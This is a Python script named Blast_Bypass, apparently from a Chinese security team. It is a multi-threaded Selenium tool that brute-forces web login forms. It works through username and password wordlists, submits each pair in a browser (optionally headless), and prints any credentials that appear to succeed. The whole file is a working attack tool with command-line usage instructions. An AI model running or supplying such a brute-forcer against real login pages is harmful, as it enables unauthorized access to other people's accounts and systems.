#!/usr/bin/env python3
# Author：Beard林
# Time：2021.7.24

from queue import Queue
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import argparse,time,threading
class selenius_c():
    def __init__(self,url,location_name_key,location_name_value,location_passwd_key,location_passwd_value,display,judge_value):

        self.url=url
        self.location_name_key=location_name_key
        self.location_name_value=location_name_value
        self.location_passwd_key=location_passwd_key
        self.location_passwd_value=location_passwd_value
        self.judge_value=judge_value

        if display:
            self.driver = webdriver.Chrome()
            self.driver.get(self.url)
        else:
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            self.driver = webdriver.Chrome(options=options)
            self.driver.get(self.url)

    def location_name(self):
        element = self.driver.find_element_by_name(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_name(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)
    def location_id(self):
        element = self.driver.find_element_by_id(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_id(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)

    def location_xpath(self):
        element = self.driver.find_element_by_xpath(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_xpath(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)

    def location_text(self):
        element = self.driver.find_element_by_link_text(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_link_text(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)

    def location_class(self):
        element = self.driver.find_element_by_class_name(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_class_name(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)

    def location_css(self):
        element = self.driver.find_element_by_css_selector(self.location_name_key)
        element.send_keys(self.location_name_value)
        element = self.driver.find_element_by_css_selector(self.location_passwd_key)
        element.send_keys(self.location_passwd_value)
    def run(self):
        element = self.driver.find_element_by_name(self.location_passwd_key)
        element.send_keys(Keys.ENTER)

    def judge(self):
        try:
            a=self.driver.find_element_by_xpath(self.judge_value)
            return False
        except :return True


    def quits(self):
        self.driver.quit()


# 多线程运行
class BLAST_BYPASS(threading.Thread):
    def __init__(self, queue,name_location_key,name_file,pass_location_key,pass_file,display,type,url,echo):
        threading.Thread.__init__(self)
        self.queue = queue
        self.name_loaction_key=name_location_key
        self.name_file=name_file
        self.pass_location_key=pass_location_key
        self.pass_file=pass_file
        self.display=display
        self.type=type
        self.url=url
        self.echo=echo

    def run(self):
        # 获取队列中的URL
        while not self.queue.empty():
            passwd = self.queue.get()
            #se=selenius_c('http://127.0.0.1/admin','login_name','root','login_pass',passwd,False,"//*[text()='管理员登录']")
            with open(self.name_file,'r') as names:
                for name in names:
                    if self.display==False:se = selenius_c(self.url,self.name_loaction_key, name, self.pass_location_key, passwd, False,self.echo)
                    else:se = selenius_c(self.url,self.name_loaction_key, name, self.pass_location_key, passwd, True,self.echo)
                    if self.type=='name':se.location_name()
                    elif self.type=='id':se.location_id()
                    elif self.type=='css':se.location_css()
                    elif self.type=='class':se.location_class()
                    elif self.type=='text':se.location_text()
                    elif self.type=='xpath':se.location_xpath()
                    se.run()
                    time.sleep(2)
                    if se.judge():
                        print('爆破成功')
                        print('账号为'+name)
                        print('密码为'+passwd)
                    else:pass
                    se.quits()


def start(name_location_key,name_file,pass_location_key,pass_file,display,type,url,echo, su):
    queue = Queue()
    f = open(pass_file, 'r')
    for i in f:
        queue.put(i.rstrip('\n'))
    # 多线程
    threads = []
    thread_count = int(su)
    for i in range(thread_count):
        threads.append(BLAST_BYPASS(queue,name_location_key,name_file,pass_location_key,pass_file,display,type,url,echo))
    for t in threads:
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":#入口
    print('+------------------------------------------')
    print('+  \033[35m灼剑安全（Tsojan）安全团队 by beard林                                   \033[0m')
    print('+  \033[34m工具名：Blast_Bypass V1.0\033[0m')
    print('+  \033[36m使用格式:  python3 Blast_Bypass.py --nk mame_location --nf name.txt \033[0m')
    print('+  \033[36m --pk passwd_location --pf password.txt --d --type id --e xxx --url http://xxxx/xx\033[0m')
    print('+------------------------------------------')
# se=selenius_c('http://127.0.0.1/admin','login_name','root','login_pass',passwd,False,"//*[text()='管理员登录']")

    parse=argparse.ArgumentParser()
    parse.add_argument('--nk', dest='name_location_key', type=str, help='查找name的位置的关键字，必须为对应type可用 ')
    parse.add_argument('--nf', dest='name_file', type=str, help='name的字典位置')
    parse.add_argument('--pk', dest='pass_location_key', type=str, help='查找password的位置的关键字')
    parse.add_argument('--pf', dest='pass_file', type=str, help='password的字典位置')
    parse.add_argument('--d',action='store_const', const=True, help='开启display')
    parse.add_argument('--type', dest='type', type=str, help='定位name字段的函数方法 支持id class name text css xpath')
    parse.add_argument('--url', dest='url', type=str, help='需要爆破的页面信息')
    parse.add_argument('--e', dest='echo', type=str, help='用于判断是否成功的字段')
    args = parse.parse_args()

    count = 10
    #name_location_key,name_file,pass_location_key,pass_file,display,type,url
    try:
        start(args.name_location_key,args.name_file,args.pass_location_key,args.pass_file,args.d,args.type,args.url,args.echo, count)
    except :print('请检查输入')
